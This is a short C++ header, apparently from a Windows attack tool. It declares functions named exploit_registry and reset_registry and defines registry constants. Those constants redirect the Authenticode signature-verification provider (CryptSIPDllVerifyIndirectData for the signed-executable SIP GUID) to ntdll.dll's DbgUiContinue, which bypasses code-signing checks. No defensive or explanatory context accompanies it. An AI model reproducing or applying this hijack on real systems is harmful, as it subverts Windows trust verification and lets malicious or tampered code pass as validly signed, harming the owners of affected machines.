#pragma once
#include "util.hpp"

constexpr auto key_define			= R"(Software\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE})";
constexpr auto DllName_define		= "Dll";
constexpr auto new_DllName_define	= R"(C:\WINDOWS\System32\ntdll.dll)";
constexpr auto FuncName_define		= "FuncName";
constexpr auto new_FuncName_define	= "DbgUiContinue";

namespace registry
{
	extern HKEY key;
	extern std::string old_dllname;
	extern std::string old_funcname;

	void exploit_registry();
	void reset_registry();
}